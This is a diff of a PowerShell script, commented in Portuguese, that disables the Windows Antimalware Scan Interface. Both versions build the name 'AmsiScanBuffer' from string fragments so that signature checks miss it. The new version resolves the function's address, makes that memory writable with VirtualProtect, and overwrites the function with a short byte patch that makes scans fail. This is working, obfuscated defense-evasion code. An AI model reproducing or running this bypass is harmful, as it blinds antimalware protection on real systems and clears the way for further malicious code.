@@ -1,57 +1,19 @@
-# Parte 2
-$APIs = @"
-using System;
-using System.ComponentModel;
-using System.Management.Automation;
-using System.Reflection;
-using System.Runtime.CompilerServices;
-using System.Runtime.InteropServices;
-using System.Text;
+# Definindo os valores que representam o nome da função e manipulando o ponteiro da função
+$a="A"
+$b="msiS"
+$c="canB"
+$d="uffer"
+[IntPtr]$funcAddr = LookupFunc amsi.dll ($a+$b+$c+$d)
 
-public class APIs {
-    [DllImport("kernel32.dll")]
-    public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, UInt32 nSize, ref UInt32 lpNumberOfBytesRead);
+# Definindo um buffer para a proteção de memória
+$oldProtectionBuffer = 0
+$vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualProtect), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))
 
-    [DllImport("kernel32.dll")]
-    public static extern IntPtr GetCurrentProcess();
+# Mudando a proteção de memória para escrita
+$vp.Invoke($funcAddr, 3, 0x40, [ref]$oldProtectionBuffer)
 
-    [DllImport("kernel32", CharSet=CharSet.Ansi, ExactSpelling=true, SetLastError=true)]
-    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
-    
-    [DllImport("kernel32.dll", CharSet=CharSet.Auto)]
-    public static extern IntPtr GetModuleHandle([MarshalAs(UnmanagedType.LPWStr)] string lpModuleName);
+# Definindo o código shellcode que será inserido na memória
+$buf = [Byte[]] (0xb8,0x34,0x12,0x07,0x80,0x66,0xb8,0x32,0x00,0xb0,0x57,0xc3)
 
-    [MethodImpl(MethodImplOptions.NoOptimization | MethodImplOptions.NoInlining)]
-    public static int Dummy() {
-   	 return 1;
-    }
-}
-"@
-
-Add-Type $APIs
-
-$InitialDate=Get-Date;
-
-$string = 'hello, world'
-$string = $string.replace('he','a')
-$string = $string.replace('ll','m')
-$string = $string.replace('o,','s')
-$string = $string.replace(' ','i')
-$string = $string.replace('wo','.d')
-$string = $string.replace('rld','ll')
-
-$string2 = 'hello, world'
-$string2 = $string2.replace('he','A')
-$string2 = $string2.replace('ll','m')
-$string2 = $string2.replace('o,','s')
-$string2 = $string2.replace(' ','i')
-$string2 = $string2.replace('wo','Sc')
-$string2 = $string2.replace('rld','an')
-
-$string3 = 'hello, world'
-$string3 = $string3.replace('hello','Bu')
-$string3 = $string3.replace(', ','ff')
-$string3 = $string3.replace('world','er')
-
-$Address = [APIS]::GetModuleHandle($string)
-[IntPtr] $funcAddr = [APIS]::GetProcAddress($Address, $string2 + $string3)
+# Copiando o shellcode para a função
+[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $funcAddr, 12)
